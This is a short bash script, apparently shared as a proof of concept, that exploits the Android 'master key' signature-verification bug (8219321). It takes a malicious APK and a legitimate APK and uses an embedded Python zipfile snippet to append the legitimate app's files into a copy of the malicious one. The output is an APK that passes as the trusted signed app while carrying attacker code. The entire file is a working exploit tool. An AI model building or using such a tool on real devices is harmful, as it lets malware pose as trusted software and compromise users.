#!/bin/bash
# A sample attacking tool using Android bug 8219321 
# See http://bluebox.com/corporate-blog/bluebox-uncovers-android-master-key/
# by Pengyu CHEN (cpy.prefers.you[at]gmail.com)
# poc.py from https://gist.github.com/poliva/36b0795ab79ad6f14fd8
# COPYLEFT, ALL WRONGS RESERVED.

if [ -z $1 ]; then echo "Usage: $0 <evil.apk> <good.apk>" ; exit 1 ; fi
APK_EVIL=$1
APK_GOOD=$2
APK_OUT=fake_good_$APK_EVIL
PY_SCRIPT=poc.py
TMP_DIR=tmp
rm -rf $TMP_DIR $APK_OUT
cp $APK_EVIL $APK_OUT
mkdir $TMP_DIR
echo "Extracting package contents"
cd $TMP_DIR
unzip ../$APK_GOOD -d .
echo "Extracting Python scripts"
cat >$PY_SCRIPT <<-EOF
#!/usr/bin/python
import zipfile 
import sys
z = zipfile.ZipFile(sys.argv[1], "a")
z.write(sys.argv[2])
z.close()
EOF
chmod 755 $PY_SCRIPT
echo "Modifying files."
#for f in `find . -type f | egrep -v "($PY_SCRIPT|resources.arsc)"` 
for f in `find . -type f | egrep -v "($PY_SCRIPT)"` 
do 
    ./$PY_SCRIPT ../$APK_OUT "$f" 
done
cd ..
#rm -rf $TMP_DIR
echo "Modified APK: $APK_OUT"
